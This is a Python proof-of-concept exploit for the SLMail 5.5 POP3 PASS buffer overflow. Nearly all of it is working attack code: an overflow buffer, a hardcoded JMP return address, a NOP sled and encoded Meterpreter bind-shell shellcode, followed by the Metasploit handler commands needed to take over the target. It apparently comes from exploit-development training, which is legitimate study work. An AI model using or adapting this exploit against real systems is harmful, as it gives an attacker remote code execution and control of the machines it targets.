'''
Script: PoC for SLMail 5.5 POP3 PASS Buffer Overflow
Vulnerability: Seattle Lab Mail (SLMail) 5.5 POP3 service PASS parameter Buffer Overflow
Tested on: Windows 7 x86

'''

import socket
import struct

host = '192.168.0.111'
port = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

junk = "A"*2606
#badchar = \x00\x0a\x0d
jmpCode = struct.pack('<I', 0x5f4a358f)

nops = "\x90"*16

#shellcode bind meterpreter shell -> tcp port 9947
'''
use multi/handler
set rhost <machine hosting SLMail>
set lport 9947
set payload windows/meterpreter/bind_tcp
'''
buf =  b""
buf += b"\xbb\xef\x27\x4f\xb5\xda\xdf\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x4e\x31\x58\x13\x03\x58\x13\x83\xc0\xeb\xc5"
buf += b"\xba\x49\x1b\x8b\x45\xb2\xdb\xec\xcc\x57\xea\x2c\xaa"
buf += b"\x1c\x5c\x9d\xb8\x71\x50\x56\xec\x61\xe3\x1a\x39\x85"
buf += b"\x44\x90\x1f\xa8\x55\x89\x5c\xab\xd5\xd0\xb0\x0b\xe4"
buf += b"\x1a\xc5\x4a\x21\x46\x24\x1e\xfa\x0c\x9b\x8f\x8f\x59"
buf += b"\x20\x3b\xc3\x4c\x20\xd8\x93\x6f\x01\x4f\xa8\x29\x81"
buf += b"\x71\x7d\x42\x88\x69\x62\x6f\x42\x01\x50\x1b\x55\xc3"
buf += b"\xa9\xe4\xfa\x2a\x06\x17\x02\x6a\xa0\xc8\x71\x82\xd3"
buf += b"\x75\x82\x51\xae\xa1\x07\x42\x08\x21\xbf\xae\xa9\xe6"
buf += b"\x26\x24\xa5\x43\x2c\x62\xa9\x52\xe1\x18\xd5\xdf\x04"
buf += b"\xcf\x5c\x9b\x22\xcb\x05\x7f\x4a\x4a\xe3\x2e\x73\x8c"
buf += b"\x4c\x8e\xd1\xc6\x60\xdb\x6b\x85\xec\x28\x46\x36\xec"
buf += b"\x26\xd1\x45\xde\xe9\x49\xc2\x52\x61\x54\x15\x95\x58"
buf += b"\x20\x89\x68\x63\x51\x83\xae\x37\x01\xbb\x07\x38\xca"
buf += b"\x3b\xa8\xed\x67\x37\x0f\x5e\x9a\xba\xc5\x5f\x30\x47"
buf += b"\x71\x8a\xcb\x98\x61\xb5\x01\xb1\x09\x48\xaa\xa0\x8c"
buf += b"\xc5\x4c\xb6\x1e\x80\xc7\x2f\xdc\xf7\xdf\xc8\x1f\xd2"
buf += b"\xa5\xd7\xaa\x85\xf2\xbf\xe3\xdf\xc5\xc0\xf4\xf5\x61"
buf += b"\x57\x7e\x1a\xb6\x46\x81\x37\x9e\x1f\x15\xcd\x4f\x6d"
buf += b"\x84\xd2\x45\x07\x46\x47\x62\x8e\x11\xff\x68\xf7\x55"
buf += b"\xa0\x93\xd2\xe6\xa7\x6c\xa3\xc5\xdc\x5b\x31\x55\x8b"
buf += b"\xa3\xd5\x55\x4b\xf2\xbf\x55\x23\xa2\x9b\x06\x56\xad"
buf += b"\x31\x3b\xcb\x38\xba\x6d\xbf\xeb\xd2\x93\xe6\xdc\x7c"
buf += b"\x6c\xcd\x5e\x7a\x92\x90\x67\x7a\x51\x45\xae\x09\xbc"
buf += b"\x55\x95\x02\x8b\xf8\xbc\x88\xf3\xaf\xbf\x98"




padding = "C"*(3500-2606-len(jmpCode)-len(buf)-len(nops))
payload = junk + jmpCode + nops + buf + padding

banner = s.recv(2048)
print(banner)
s.send("USER anyuser\r\n")
s.send("PASS " + payload + "\r\n")
print("[*] Meterpreter Bind TCP Shell Executed, try to use metasploit connect port 9947.")

s.close()


